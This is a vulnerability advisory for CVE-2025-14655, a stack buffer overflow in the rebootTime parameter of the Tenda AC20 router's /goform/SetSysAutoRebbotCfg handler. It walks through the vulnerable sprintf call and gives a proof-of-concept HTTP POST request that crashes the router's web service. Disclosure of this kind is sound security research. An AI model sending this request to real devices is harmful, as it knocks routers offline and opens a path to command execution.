------
### **CVE-2025-14655**

**Affected Product**: Tenda AC20 Router

**Affected Firmware Versions**:  V16.03.08.12

**Vulnerability Type**: Buffer Overflow Vulnerability

**Organization**: School of Cybersecurity, Northwestern Polytechnical University

**Author**: 邱佳慧 毛伯敏 郭鸿志

------
### **Vulnerability Description**

In the latest firmware version V16.03.08.12 of the Tenda AC20 router, the `rebootTime` parameter of `/goform/SetSysAutoRebbotCfg` in the `/bin/httpd` binary contains a stack-based buffer overflow vulnerability that can lead to denial-of-service and arbitrary command execution.


---
### **Vulnerability Details**
In the `httpd` binary, the function corresponding to `/goform/SetSysAutoRebbotCfg` is `formSetRebootTimer`.

![1](./img/1.png)

The function first uses the `webGetVar` function to retrieve the `rebootTime` parameter from `a1` and assigns it to `v2`, and then calls the `sub_497114` function.

![2](./img/2.png)

In this function the length of the input parameter is not limited. The `v5` buffer is only 8 bytes long, while `v3` and `v4` can each be up to 10 digits (an `int` is typically 32-bit with range `-2147483648` to `2147483647`). Therefore there is a buffer-overflow vulnerability at the `sprintf` call.

![3](./img/3.png)


---
### **PoC**
```
POST /goform/SetSysAutoRebbotCfg HTTP/1.1
Host: 192.168.254.139
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: text/plain, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 30
Origin: http://192.168.254.139
Connection: close
Priority: u=0

rebootTime=999999999:999999999
```

After the request was sent, a segmentation fault occurred in the service:

![4](./img/4.png)
